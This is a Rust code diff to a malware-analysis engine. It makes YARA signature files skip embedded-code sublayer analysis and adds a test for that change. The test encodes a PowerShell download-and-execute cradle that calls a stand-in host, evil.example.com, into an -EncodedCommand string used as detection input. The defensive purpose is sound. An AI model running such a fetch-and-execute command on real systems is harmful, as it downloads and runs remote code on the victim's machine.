@@ -1790,14 +1790,14 @@ pub(crate) fn analyze_script_deobfuscation_layers(
 /// and `deltree` become visible to text rules. The layer is not re-expanded.
 pub(crate) fn analyze_batch_expansion_layer(
     parent_path: &str,
-    content: &str,
+    content: &[u8],
     engine: &crate::Engine,
 ) -> Option<FileAnalysis> {
     const ENCODING: &str = "batch-expansion";
     if parent_path.contains(ENCODING) {
         return None;
     }
-    let result = stng::script::expand_batch_variables(content.as_bytes())?;
+    let result = stng::script::expand_batch_variables(content)?;
     let encoding_chain = vec![ENCODING.to_string()];
     let virtual_path = encode_decoded_path(parent_path, &encoding_chain, result.offset);
     let analyzer =
@@ -1977,14 +1977,19 @@ pub(crate) fn process_all_strings_with_host(
         return (Vec::new(), Vec::new());
     }
 
-    // Documentation/prose files embed code blocks as examples, not as executable
-    // sublayers. Treat them as plain text mentions: do not create typed embedded
-    // sub-analyses (which would let script-targeted rules fire on install docs).
-    if let Some(host @ (FileType::Markdown | FileType::PkgInfo | FileType::Rtf | FileType::Text)) =
-        host_file_type
+    // Documentation embeds examples; YARA strings are matching predicates.
+    // Neither executes the program text inside those strings. Preserve the
+    // strings for host-language rules without synthesizing executable layers.
+    if let Some(
+        host @ (FileType::Markdown
+        | FileType::PkgInfo
+        | FileType::Rtf
+        | FileType::Text
+        | FileType::Yara),
+    ) = host_file_type
     {
         tracing::debug!(
-            "embedded_code_detector: Skipping embedded sublayers for document type {:?} in {}",
+            "embedded_code_detector: Skipping embedded sublayers for declarative/document type {:?} in {}",
             host,
             parent_path
         );
@@ -3014,6 +3019,39 @@ IAAAAAAAsDyZDwU=";
             }),
             "unified source path must not re-scan EncodedCommand"
         );
+    }
+
+    #[test]
+    fn yara_signature_strings_do_not_become_program_layers() {
+        use base64::Engine;
+        let code =
+            "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
+        let wide: Vec<u8> = code.encode_utf16().flat_map(u16::to_le_bytes).collect();
+        let encoded = base64::engine::general_purpose::STANDARD.encode(wide);
+        let info = make_string_info(&format!("powershell.exe -EncodedCommand {encoded}\n"));
+        let engine = test_mapper();
+        let (binary_layers, _) = process_all_strings(
+            "payload.bin",
+            std::slice::from_ref(&info),
+            &engine,
+            0,
+            Some(&FileType::Data),
+            None,
+        );
+        assert!(
+            !binary_layers.is_empty(),
+            "opaque payload analysis must remain enabled"
+        );
+        let (yara_layers, yara_findings) = process_all_strings(
+            "signature.yar",
+            &[info],
+            &engine,
+            0,
+            Some(&FileType::Yara),
+            None,
+        );
+        assert!(yara_layers.is_empty());
+        assert!(yara_findings.is_empty());
     }
 
     #[test]
